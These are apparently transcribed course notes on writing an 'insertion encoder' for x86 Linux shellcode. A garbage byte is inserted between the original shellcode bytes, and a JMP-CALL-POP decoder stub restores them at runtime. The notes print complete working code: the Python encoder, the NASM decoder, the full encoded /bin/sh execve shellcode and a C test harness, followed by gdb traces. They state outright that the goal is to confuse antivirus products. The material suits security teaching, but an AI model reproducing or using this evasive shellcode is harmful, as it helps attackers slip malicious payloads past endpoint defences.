#Insertion Encoder

Hello students! In this video we will try to write another our
custom encoder which I call Insertion Encoder. Now what is really
Insertion Encoder? 

In Insertion Encoder I basically insert an absolute garbage byte
between every two bytes of the original shellcode.

```
Original Shellcode:

----------------------------------
| 0x12 | 0xab | 0xac | 0x01 | ...
----------------------------------

After Insertion

-------------------------------------------------------------
| 0x12 | 0xaa | 0xab | 0xaa | 0xac | 0xaa | 0x01 | 0xaa ....
-------------------------------------------------------------
```

So you can actually see 0xaa between every two bytes of the original
shellcode. Now, variations of these could be a random value or you
could probably have increasing sequence and things like that. So the
basic idea is there is **garbage** and this could end up probably
confusing a lot of AV systems. 

Now, how do we go ahead and write decoder for this? So the idea is
again similar to what we've done in previous videos which is write
**Insertion Decoder Stub** and what that stub would do is take
next normal byte of shellcode and put it on the previous place where
garbage byte was.

```
-------------------------------------------------------------
| 0x12 | 0xaa | 0xab | 0xaa | 0xac | 0xaa | 0x01 | 0xaa ....
-------------------------------------------------------------
		 ^		 |
		 |		 |
		 ---------
```

So what takes place is original shellcode is now moving at the absolute
front and we are overwriting all values and ensuring that no garbage
values exist in between. 

Once this whole process is complete, just like in previous cases
we send control to the beginning of the original decoded shellcode.

```
			---------------
			|			  v
---------------------------------------------------------
Insertion Decoder Stub | 0x12 | 0xab | 0xac | 0x01 | ...
---------------------------------------------------------
```

So, let's go ahead and do this. Now, I have written a very simple 
python script to do the insertion encoder. And what it really does is
take a piece of shellcode and insert 0xaa after every byte of the
shellcode.

```py
#!/usr/bin/python

# Python Insertion Encoder 
import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
        encoded += '\\x'
        encoded += '%02x' % x
        encoded += '\\x%02x' % 0xAA

        # encoded += '\\x%02x' % random.randint(1,255)

        encoded2 += '0x'
        encoded2 += '%02x,' %x
        encoded2 += '0x%02x,' % 0xAA

        # encoded2 += '0x%02x,' % random.randint(1,255)



print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
```

There we use the previous `/bin/sh` shellcode. And run the python
script

```
$ ./Insertion-Encoder.py 
Encoded shellcode ...
\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa
0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa,
Len: 25
```

And this is going to give us the new shellcode which has 0xaa inserted
in every even location. So now the length of the shellcode is actually
50 because the original shellcode length was 25.

Now, let me actually start writing the decoder program.

```asm
global _start

section .text
_start:



        EncodedShellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa
```

And now let me go back on writing the decoder stub. Just like what
we've done before I'll get the encoded shellcode address using 
JMP-CALL-POP technique, so we have

```asm
global _start

section .text
_start:

        jmp short call_shellcode

decoder:
        pop esi

decode:

call_shellcode:

        call decoder
        EncodedShellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa
```

Now, we basically want to take every odd value and replace 0xaa with
this value and so on. So we need a counter which increments and allows
us to do that. Hovewer, we need two counters. One is to keep track
of the next 0xaa and second for tracking the original shellcode byte.

So let me use `edi` as the other counter which tracks along encoded
shellcode

```asm
decoder:
        pop esi
        lea edi, [esi + 1]
```

So `esi + 1` really is tracking the first 0xaa. And the second counter


```asm
decoder:
        pop esi
        lea edi, [esi + 1]
        xor eax, eax
        mov al, 1
        xor ebx, ebx
```

Now what I am going to do is the following

```asm
decoder:
        pop esi
        lea edi, [esi + 1]
        xor eax, eax
        mov al, 1
        xor ebx, ebx

decode:
        mov bl, byte [esi + eax]
```

Here I need a method with which I can also figure out when I should 
stop decoding the shellcode. So how do we do this?

Now, at the end of encoded shellcode I am going to add two values
`0xbb,0xbb`. In the next instruction I basically do `xor bl,0xaa`.
Please note that till the time we are in the context of shellcode
this `xor bl, 0xaa` would end up resulting in a zero and hence 
the Zero Flag would be set. Now, when we go beyound our shellcode
we would end up xoring with 0xbb and this would end up with a non-zero
value. So what this means is that we have ended our encoded shellcode.
Which means we now comfortably go to executing the decoded shellcode.

```asm
decode:
        mov bl, byte [esi + eax]
        xor bl, 0xaa
        jnz short EncodedShellcode
        mov bl, byte [esi + eax + 1]
        mov byte [edi], bl
```

Now, after this as you could imagine we need to increment `edi` to
point to the next location and also increment `al` counter up to 2.

```
decode:
        mov bl, byte [esi + eax]
        xor bl, 0xaa
        jnz short EncodedShellcode
        mov bl, byte [esi + eax + 1]
        mov byte [edi], bl
        inc edi
        add al, 2
        jmp short decode
```

It will continue to happen till the time we **do not** hit an 0xaa
at even location and when this happens immediately we know that we
have finished decoding and transfer goes to `EncodedShellcode` where
our shellcode executes.

Hopefully, everything is ok. Let me go ahead and compile and link it.

```
nasm -f elf32 insertion-decoder.nasm
ld -o insertion-decoder insertion-decoder.o
```

Let use `objdump` to check we don't have any NULLs.

```
$ objdump -d insertion-decoder -M intel

insertion-decoder:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 1d                	jmp    804807f <call_shellcode>

08048062 <decoder>:
 8048062:	5e                   	pop    esi
 8048063:	8d 7e 01             	lea    edi,[esi+0x1]
 8048066:	31 c0                	xor    eax,eax
 8048068:	b0 01                	mov    al,0x1
 804806a:	31 db                	xor    ebx,ebx

0804806c <decode>:
 804806c:	8a 1c 06             	mov    bl,BYTE PTR [esi+eax*1]
 804806f:	80 f3 aa             	xor    bl,0xaa
 8048072:	75 10                	jne    8048084 <EncodedShellcode>
 8048074:	8a 5c 06 01          	mov    bl,BYTE PTR [esi+eax*1+0x1]
 8048078:	88 1f                	mov    BYTE PTR [edi],bl
 804807a:	47                   	inc    edi
 804807b:	04 02                	add    al,0x2
 804807d:	eb ed                	jmp    804806c <decode>

0804807f <call_shellcode>:
 804807f:	e8 de ff ff ff       	call   8048062 <decoder>

08048084 <EncodedShellcode>:
 8048084:	31 aa c0 aa 50 aa    	xor    DWORD PTR [edx-0x55af5540],ebp
 804808a:	68 aa 2f aa 2f       	push   0x2faa2faa
 804808f:	aa                   	stos   BYTE PTR es:[edi],al
 8048090:	73 aa                	jae    804803c <_start-0x24>
 8048092:	68 aa 68 aa 2f       	push   0x2faa68aa
 8048097:	aa                   	stos   BYTE PTR es:[edi],al
 8048098:	62 aa 69 aa 6e aa    	bound  ebp,QWORD PTR [edx-0x55915597]
 804809e:	89 aa e3 aa 50 aa    	mov    DWORD PTR [edx-0x55af551d],ebp
 80480a4:	89 aa e2 aa 53 aa    	mov    DWORD PTR [edx-0x55ac551e],ebp
 80480aa:	89 aa e1 aa b0 aa    	mov    DWORD PTR [edx-0x554f551f],ebp
 80480b0:	0b aa cd aa 80 aa    	or     ebp,DWORD PTR [edx-0x557f5533]
```

That's it. Let's cut out shellcode

```
$ shellcode-dump.sh insertion-decoder
"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa"
```

copy this in `shellcode.c`

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

and compile it

```
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

and run this

```
$ ./shellcode 
Shellcode Length:  86
$ 
$ 
$
```

And awesome if you notice we have our `/bin/sh` shell just as expected

Let's quickly look at gdb and see what is really going on in all of 
that decoding.

```
gdb -q ./shellcode
```

```
(gdb) break *&code
Breakpoint 1 at 0x804a040
```

```
(gdb) set disassembly-flavor intel
(gdb) run
```

```
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0804a040 <+0>:	jmp    0x804a05f <code+31>
   0x0804a042 <+2>:	pop    esi
   0x0804a043 <+3>:	lea    edi,[esi+0x1]
   0x0804a046 <+6>:	xor    eax,eax
   0x0804a048 <+8>:	mov    al,0x1
   0x0804a04a <+10>:	xor    ebx,ebx
   0x0804a04c <+12>:	mov    bl,BYTE PTR [esi+eax*1]
   0x0804a04f <+15>:	xor    bl,0xaa
   0x0804a052 <+18>:	jne    0x804a064 <code+36>
   0x0804a054 <+20>:	mov    bl,BYTE PTR [esi+eax*1+0x1]
   0x0804a058 <+24>:	mov    BYTE PTR [edi],bl
   0x0804a05a <+26>:	inc    edi
   0x0804a05b <+27>:	add    al,0x2
   0x0804a05d <+29>:	jmp    0x804a04c <code+12>
   0x0804a05f <+31>:	call   0x804a042 <code+2>
   0x0804a064 <+36>:	xor    DWORD PTR [edx-0x55af5540],ebp
   0x0804a06a <+42>:	push   0x2faa2faa
   0x0804a06f <+47>:	stos   BYTE PTR es:[edi],al
   0x0804a070 <+48>:	jae    0x804a01c
   0x0804a072 <+50>:	push   0x2faa68aa
   0x0804a077 <+55>:	stos   BYTE PTR es:[edi],al
   0x0804a078 <+56>:	bound  ebp,QWORD PTR [edx-0x55915597]
   0x0804a07e <+62>:	mov    DWORD PTR [edx-0x55af551d],ebp
   0x0804a084 <+68>:	mov    DWORD PTR [edx-0x55ac551e],ebp
   0x0804a08a <+74>:	mov    DWORD PTR [edx-0x554f551f],ebp
   0x0804a090 <+80>:	or     ebp,DWORD PTR [edx-0x557f5533]
   0x0804a096 <+86>:	add    BYTE PTR [eax],al
End of assembler dump.
```

Ok, here we are and our encoded shellcode if you quickly recall
starts basically from this location:

```
   0x0804a064 <+36>:	xor    DWORD PTR [edx-0x55af5540],ebp
   0x0804a06a <+42>:	push   0x2faa2faa
   0x0804a06f <+47>:	stos   BYTE PTR es:[edi],al
   0x0804a070 <+48>:	jae    0x804a01c
   0x0804a072 <+50>:	push   0x2faa68aa
   0x0804a077 <+55>:	stos   BYTE PTR es:[edi],al
   0x0804a078 <+56>:	bound  ebp,QWORD PTR [edx-0x55915597]
   0x0804a07e <+62>:	mov    DWORD PTR [edx-0x55af551d],ebp
   0x0804a084 <+68>:	mov    DWORD PTR [edx-0x55ac551e],ebp
   0x0804a08a <+74>:	mov    DWORD PTR [edx-0x554f551f],ebp
   0x0804a090 <+80>:	or     ebp,DWORD PTR [edx-0x557f5533]
   0x0804a096 <+86>:	add    BYTE PTR [eax],al
```

just below the `call`. So what we really want to do is we basically
want to look at how this is changing over time in its single
iteration.

So let's go ahead and see that we actually look at our shellcode

```
(gdb) x/20xb 0x0804a064
0x804a064 <code+36>:	0x31	0xaa	0xc0	0xaa	0x50	0xaa	0x68	0xaa
0x804a06c <code+44>:	0x2f	0xaa	0x2f	0xaa	0x73	0xaa	0x68	0xaa
0x804a074 <code+52>:	0x68	0xaa	0x2f	0xaa
```

and now if I look at my file which is `insertion-decoder.nasm`

```
(gdb) shell cat insertion-decoder.nasm
```

then we'll see there

```
	call decoder
	EncodedShellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa
```

that it's exactly what at `0x0804a064` address.

So what also I want to do is to setup breakpoint at `0x0804a064`. So 
as soon as decoding finishs we know that our shellcode is decoded.

```
(gdb) break *0x0804a064
```

Let's make some steps to see how the shifting is happening

```
(gdb) define hook-stop
>disassemble 
>x/20xb 0x0804a064
>end
```

Now let me actually make some `stepi`

```
(gdb) stepi
Dump of assembler code for function code:
   0x0804a040 <+0>:	jmp    0x804a05f <code+31>
   0x0804a042 <+2>:	pop    esi
   0x0804a043 <+3>:	lea    edi,[esi+0x1]
   0x0804a046 <+6>:	xor    eax,eax
   0x0804a048 <+8>:	mov    al,0x1
   0x0804a04a <+10>:	xor    ebx,ebx
   0x0804a04c <+12>:	mov    bl,BYTE PTR [esi+eax*1]
   0x0804a04f <+15>:	xor    bl,0xaa
   0x0804a052 <+18>:	jne    0x804a064 <code+36>
   0x0804a054 <+20>:	mov    bl,BYTE PTR [esi+eax*1+0x1]
   0x0804a058 <+24>:	mov    BYTE PTR [edi],bl
=> 0x0804a05a <+26>:	inc    edi
   0x0804a05b <+27>:	add    al,0x2
   0x0804a05d <+29>:	jmp    0x804a04c <code+12>
   0x0804a05f <+31>:	call   0x804a042 <code+2>
   0x0804a064 <+36>:	xor    eax,eax
   0x0804a066 <+38>:	shr    BYTE PTR [edx-0x559755b0],0x2f
   0x0804a06d <+45>:	stos   BYTE PTR es:[edi],al
   0x0804a06e <+46>:	das    
   0x0804a06f <+47>:	stos   BYTE PTR es:[edi],al
   0x0804a070 <+48>:	jae    0x804a01c
   0x0804a072 <+50>:	push   0x2faa68aa
   0x0804a077 <+55>:	stos   BYTE PTR es:[edi],al
   0x0804a078 <+56>:	bound  ebp,QWORD PTR [edx-0x55915597]
   0x0804a07e <+62>:	mov    DWORD PTR [edx-0x55af551d],ebp
   0x0804a084 <+68>:	mov    DWORD PTR [edx-0x55ac551e],ebp
   0x0804a08a <+74>:	mov    DWORD PTR [edx-0x554f551f],ebp
   0x0804a090 <+80>:	or     ebp,DWORD PTR [edx-0x557f5533]
   0x0804a096 <+86>:	add    BYTE PTR [eax],al
End of assembler dump.
0x804a064 <code+36>:	0x31	0xc0	0xc0	0xaa	0x50	0xaa	0x68	0xaa
0x804a06c <code+44>:	0x2f	0xaa	0x2f	0xaa	0x73	0xaa	0x68	0xaa
```

Now in the next time `0x50` is going to overwrite second `0xc0` 
location. So let's go for this real fast. We just can setup breakpoint
at this location

```
0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
```

```
(gdb) break *0x0804a058
(gdb) c
(gdb) stepi
Dump of assembler code for function code:
   0x0804a040 <+0>:	jmp    0x804a05f <code+31>
   0x0804a042 <+2>:	pop    esi
   0x0804a043 <+3>:	lea    edi,[esi+0x1]
   0x0804a046 <+6>:	xor    eax,eax
   0x0804a048 <+8>:	mov    al,0x1
   0x0804a04a <+10>:	xor    ebx,ebx
   0x0804a04c <+12>:	mov    bl,BYTE PTR [esi+eax*1]
   0x0804a04f <+15>:	xor    bl,0xaa
   0x0804a052 <+18>:	jne    0x804a064 <code+36>
   0x0804a054 <+20>:	mov    bl,BYTE PTR [esi+eax*1+0x1]
   0x0804a058 <+24>:	mov    BYTE PTR [edi],bl
=> 0x0804a05a <+26>:	inc    edi
   0x0804a05b <+27>:	add    al,0x2
   0x0804a05d <+29>:	jmp    0x804a04c <code+12>
   0x0804a05f <+31>:	call   0x804a042 <code+2>
   0x0804a064 <+36>:	xor    eax,eax
   0x0804a066 <+38>:	push   eax
   0x0804a067 <+39>:	stos   BYTE PTR es:[edi],al
   0x0804a068 <+40>:	push   eax
   0x0804a069 <+41>:	stos   BYTE PTR es:[edi],al
   0x0804a06a <+42>:	push   0x2faa2faa
   0x0804a06f <+47>:	stos   BYTE PTR es:[edi],al
   0x0804a070 <+48>:	jae    0x804a01c
   0x0804a072 <+50>:	push   0x2faa68aa
   0x0804a077 <+55>:	stos   BYTE PTR es:[edi],al
   0x0804a078 <+56>:	bound  ebp,QWORD PTR [edx-0x55915597]
   0x0804a07e <+62>:	mov    DWORD PTR [edx-0x55af551d],ebp
   0x0804a084 <+68>:	mov    DWORD PTR [edx-0x55ac551e],ebp
   0x0804a08a <+74>:	mov    DWORD PTR [edx-0x554f551f],ebp
   0x0804a090 <+80>:	or     ebp,DWORD PTR [edx-0x557f5533]
   0x0804a096 <+86>:	add    BYTE PTR [eax],al
End of assembler dump.
0x804a064 <code+36>:	0x31	0xc0	0x50	0xaa	0x50	0xaa	0x68	0xaa
```

Now we see that this location was really overwritten by 0x50. After
that 0xaa will be overwritten by 0x68.

```
(gdb) stepi
Dump of assembler code for function code:
   0x0804a040 <+0>:	jmp    0x804a05f <code+31>
   0x0804a042 <+2>:	pop    esi
   0x0804a043 <+3>:	lea    edi,[esi+0x1]
   0x0804a046 <+6>:	xor    eax,eax
   0x0804a048 <+8>:	mov    al,0x1
   0x0804a04a <+10>:	xor    ebx,ebx
   0x0804a04c <+12>:	mov    bl,BYTE PTR [esi+eax*1]
   0x0804a04f <+15>:	xor    bl,0xaa
   0x0804a052 <+18>:	jne    0x804a064 <code+36>
   0x0804a054 <+20>:	mov    bl,BYTE PTR [esi+eax*1+0x1]
   0x0804a058 <+24>:	mov    BYTE PTR [edi],bl
=> 0x0804a05a <+26>:	inc    edi
   0x0804a05b <+27>:	add    al,0x2
   0x0804a05d <+29>:	jmp    0x804a04c <code+12>
   0x0804a05f <+31>:	call   0x804a042 <code+2>
   0x0804a064 <+36>:	xor    eax,eax
   0x0804a066 <+38>:	push   eax
   0x0804a067 <+39>:	push   0xaa68aa50
   0x0804a06c <+44>:	das    
   0x0804a06d <+45>:	stos   BYTE PTR es:[edi],al
   0x0804a06e <+46>:	das    
   0x0804a06f <+47>:	stos   BYTE PTR es:[edi],al
   0x0804a070 <+48>:	jae    0x804a01c
   0x0804a072 <+50>:	push   0x2faa68aa
   0x0804a077 <+55>:	stos   BYTE PTR es:[edi],al
   0x0804a078 <+56>:	bound  ebp,QWORD PTR [edx-0x55915597]
   0x0804a07e <+62>:	mov    DWORD PTR [edx-0x55af551d],ebp
   0x0804a084 <+68>:	mov    DWORD PTR [edx-0x55ac551e],ebp
   0x0804a08a <+74>:	mov    DWORD PTR [edx-0x554f551f],ebp
   0x0804a090 <+80>:	or     ebp,DWORD PTR [edx-0x557f5533]
   0x0804a096 <+86>:	add    BYTE PTR [eax],al
End of assembler dump.
0x804a064 <code+36>:	0x31	0xc0	0x50	0x68	0x50	0xaa	0x68	0xaa
```

And so on and this would keep on happening because we keep moving our
original shellcode back into its logical position. Now we can delete
breakpoint at `0x0804a058` position and after that continue execution.

```
(gdb) info breakpoints 
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x0804a040 <code>
	breakpoint already hit 1 time
2       breakpoint     keep y   0x0804a064 <code+36>
3       breakpoint     keep y   0x0804a058 <code+24>
	breakpoint already hit 2 times
```

```
(gdb) d 3
(gdb) c
Continuing.
Dump of assembler code for function code:
   0x0804a040 <+0>:	jmp    0x804a05f <code+31>
   0x0804a042 <+2>:	pop    esi
   0x0804a043 <+3>:	lea    edi,[esi+0x1]
   0x0804a046 <+6>:	xor    eax,eax
   0x0804a048 <+8>:	mov    al,0x1
   0x0804a04a <+10>:	xor    ebx,ebx
   0x0804a04c <+12>:	mov    bl,BYTE PTR [esi+eax*1]
   0x0804a04f <+15>:	xor    bl,0xaa
   0x0804a052 <+18>:	jne    0x804a064 <code+36>
   0x0804a054 <+20>:	mov    bl,BYTE PTR [esi+eax*1+0x1]
   0x0804a058 <+24>:	mov    BYTE PTR [edi],bl
   0x0804a05a <+26>:	inc    edi
   0x0804a05b <+27>:	add    al,0x2
   0x0804a05d <+29>:	jmp    0x804a04c <code+12>
   0x0804a05f <+31>:	call   0x804a042 <code+2>
=> 0x0804a064 <+36>:	xor    eax,eax
   0x0804a066 <+38>:	push   eax
   0x0804a067 <+39>:	push   0x68732f2f
   0x0804a06c <+44>:	push   0x6e69622f
   0x0804a071 <+49>:	mov    ebx,esp
   0x0804a073 <+51>:	push   eax
   0x0804a074 <+52>:	mov    edx,esp
   0x0804a076 <+54>:	push   ebx
   0x0804a077 <+55>:	mov    ecx,esp
   0x0804a079 <+57>:	mov    al,0xb
   0x0804a07b <+59>:	int    0x80
   0x0804a07d <+61>:	add    BYTE PTR [ecx+0x50aae3aa],cl
   0x0804a083 <+67>:	stos   BYTE PTR es:[edi],al
   0x0804a084 <+68>:	mov    DWORD PTR [edx-0x55ac551e],ebp
   0x0804a08a <+74>:	mov    DWORD PTR [edx-0x554f551f],ebp
   0x0804a090 <+80>:	or     ebp,DWORD PTR [edx-0x557f5533]
   0x0804a096 <+86>:	add    BYTE PTR [eax],al
End of assembler dump.
```

So if you notice this is exactly nothing but the `execve-stack` 
shellcode

```
=> 0x0804a064 <+36>:	xor    eax,eax
   0x0804a066 <+38>:	push   eax
   0x0804a067 <+39>:	push   0x68732f2f
   0x0804a06c <+44>:	push   0x6e69622f
   0x0804a071 <+49>:	mov    ebx,esp
   0x0804a073 <+51>:	push   eax
   0x0804a074 <+52>:	mov    edx,esp
   0x0804a076 <+54>:	push   ebx
   0x0804a077 <+55>:	mov    ecx,esp
   0x0804a079 <+57>:	mov    al,0xb
   0x0804a07b <+59>:	int    0x80
```

And now all of this has been finally decoded by our insertion decoder.
And we continue execution

```
(gdb) c
Continuing.
process 2928 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
$ 
$ 
$ 
```

So hopefully this example was crystal clear. In reality, guys, what I
really want to tell you is **use your creativity and imagination**.
As I said writing a custom encoder is really your creativity and
imagining how would you want to shift things around or encrypt things
or encode things. And it isn't very difficult if you want to use this
for own purposes. Else if you want to share it with other people there
starts game with AV software developpers.

